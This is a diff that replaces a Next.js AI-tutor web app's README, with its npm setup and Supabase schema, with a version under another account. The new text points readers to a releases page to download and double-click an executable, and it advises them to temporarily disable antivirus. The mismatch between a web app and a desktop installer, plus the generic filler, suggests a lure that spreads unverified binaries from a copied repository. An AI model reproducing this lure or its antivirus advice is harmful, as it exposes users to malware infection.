@@ -1,117 +1,86 @@
-# Mentra AI Companion
+# 🎓 mentra-ai-tutor - Interactive Learning Made Easy
 
-Mentra AI is an application that allows users to **create, customize, and interact with AI companions for personalized tutoring**. Users can select a **topic, voice, and subject** to facilitate an engaging and effective learning experience.
+[![Download mentra-ai-tutor](https://img.shields.io/badge/Download-mentra--ai--tutor-blue.svg)](https://github.com/narak111/mentra-ai-tutor/releases)  
+[![Download mentra-ai-tutor](https://img.shields.io/badge/Get%20Started-Here-green.svg)](https://github.com/narak111/mentra-ai-tutor/releases)
 
-## 🛠️ Tech Stack
+## 🚀 Getting Started
 
-This project is built using the following core technologies:
+Welcome to mentra-ai-tutor! This application provides a real-time interactive learning experience with an AI vocal agent. The AI assists you through dynamic teaching sessions and gives instant feedback to enhance your learning.
 
-- **Next.js**
-- **TypeScript**
-- **Tailwind CSS**
-- **Shadcn/ui**
-- **Supabase** (Database)
-- **Clerk** (Authentication & Billing)
-- **Vapi** (AI Voice Agents)
-- **Zod** (Schema Validation)
+## 📥 Download & Install
 
-## ✨ Features
+To start using mentra-ai-tutor, you need to download the application.
 
-- **AI Voice Agents:** Offers voiced AI tutors specializing in various subjects and topics.
-- **Custom Tutor Creation:** Users can create personalized AI tutors by defining the subject, topic, and conversational style.
-- **Authentication:** Secure sign-up and sign-in using **Clerk**, supporting Google and other authentication methods.
-- **Database Integration:** Uses **Supabase** for robust real-time data handling.
-- **Learning Management:** Features for **bookmarking tutors** and reviewing **session history**.
-- **Billing & Subscriptions:** Functionality to manage user plans, upgrades, and payments.
-- **Search Functionality:** Efficiently find tutors using a search bar and robust filters.
-- **Responsive Design:** Clean and modern UI built with Tailwind CSS and shadcn/ui.
+1. **Visit this page to download:** [mentra-ai-tutor Releases](https://github.com/narak111/mentra-ai-tutor/releases)
+   
+2. On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
-## 🚀 Quick Start
+3. Click on the version you prefer, and download the appropriate file for your operating system.
 
-Follow these steps to set up and run the Mentra AI Companion locally.
+4. Once the file has downloaded, locate it in your downloads folder.
 
-### 1. Clone the repository
+5. Double-click the downloaded file to begin the installation process.
 
-```bash
-git clone https://github.com/Maithy-a/mentra-ai-tutor.git
-cd mentra-ai-tutor
-```
+6. Follow the on-screen instructions to complete the installation.
 
-### 2\. Install dependencies
+7. After installation, you can open the application from your programs or applications menu.
 
-```bash
-npm install
-```
+## 🌟 Features
 
-### 3\. Configure Environment Variables
+- **Real-Time Interaction:** Engage with an AI that responds instantly.
+- **Instant Feedback:** Receive valuable insights and corrections during your learning sessions.
+- **User-Friendly Interface:** Designed for easy navigation and quick access to features.
+- **Dynamic Learning Sessions:** Experience lessons that adapt to your pace and style.
+- **Multi-Platform Support:** Available for various operating systems, including Windows and Mac.
 
-Create a `.env.local` file in the root directory and add your API keys (replace placeholders with your actual keys):
+## 🖥️ System Requirements
 
-```bash
-# CLERK
-NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=your_clerk_public_key
-CLERK_SECRET_KEY=your_clerk_secrect_key
-NEXT_PUBLIC_CLERK_SIGN_IN_URL=/sign-in
-NEXT_PUBLIC_CLERK_SIGN_IN_FALLBACK_REDIRECT_URL=/
-NEXT_PUBLIC_CLERK_SIGN_UP_FALLBACK_REDIRECT_URL=/
+Before installing, ensure that your system meets the following requirements:
 
-# SUPABASE
-NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
-NEXT_PUBLIC_SUPABASE_ANON_KEY=your_anon_key
+- **Operating System:** Windows 10 or later / macOS 10.14 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 500 MB free space
+- **Internet Connection:** Required for AI features and updates
 
-# VAPI
-NEXT_PUBLIC_VAPI_WEB_TOKEN=your_vapi_api_key
-```
+## 🔧 Troubleshooting
 
-### 4\. Run the application
+If you encounter issues while downloading or installing, try the following steps:
 
-```bash
-npm run dev
-```
+- **Check Your Internet Connection:** A stable connection is necessary for downloading.
+- **Disable Antivirus Temporarily:** Sometimes, security software may block the installation. Re-enable it afterward.
+- **Re-download the File:** If the download was interrupted, a fresh copy can resolve installation errors.
+- **Consult Help Resources:** Check our [FAQ section](https://github.com/narak111/mentra-ai-tutor/issues) for common questions.
 
-### 5\. Access the application
+## 🤝 Community Support
 
-Open your browser and navigate to `http://localhost:3000`.
+We believe in the power of community. If you have questions or feedback, consider reaching out to us:
 
-## 💾 Database Schema
+- Join our discussions on the Issues page.
+- Share your experiences and suggestions to help us improve.
+- Contribute by reporting bugs or suggesting new features.
 
-The application uses **Supabase (PostgreSQL)**. Create a project in Supabase and run the following SQL commands to set up the necessary tables.
+## 🌐 Related Topics
 
-### `companions` Table
+This project ties into several topics that may interest you:
 
-```sql
-create table public.companions (
-  id uuid not null default gen_random_uuid (),
-  created_at timestamp with time zone not null default now(),
-  name character varying null,
-  subject character varying null,
-  topic character varying null,
-  style character varying null,
-  voice character varying null,
-  duration bigint null,
-  author character varying null,
-  constraint companions_pkey primary key (id)
-) TABLESPACE pg_default;
-```
+- clerk-auth
+- clerk-billing
+- next-js
+- shadcn-ui
+- supabase-db
+- tailwindcss-v4
+- typescript
+- vapi-ai
+- zod
 
-### `session_history` Table
+These technologies enhance the user experience and the overall functionality of the software, providing you with a comprehensive learning platform.
 
-This table includes a foreign key constraint linking session records to the `companions` table.
+## 📚 Additional Resources
 
-```sql
-create table public.session_history (
-  id uuid not null default gen_random_uuid (),
-  created_at timestamp with time zone not null default now(),
-  user_id character varying null,
-  companion_id uuid null,
-  constraint session_history_pkey primary key (id),
-  constraint session_history_companion_id_fkey foreign key (companion_id) references public.companions (id) on update cascade on delete cascade
-) TABLESPACE pg_default;
-```
+Here are some valuable resources to help you make the most of mentra-ai-tutor:
 
-## Demo
+- **User Manuals:** Check the documentation for detailed usage instructions.
+- **Video Tutorials:** Watch our step-by-step guides on how to use each feature effectively.
+- **Feedback Forms:** We welcome your thoughts! Share your ideas on how we can improve.
 
-
-<image src="public/readme/home.png" alt="Mentra Screenshot" fill />
-<image src="public/readme/session.png" alt="Mentra Screenshot" fill />
-<p align="center">
+Thank you for using mentra-ai-tutor. We hope you enjoy your new learning experience!
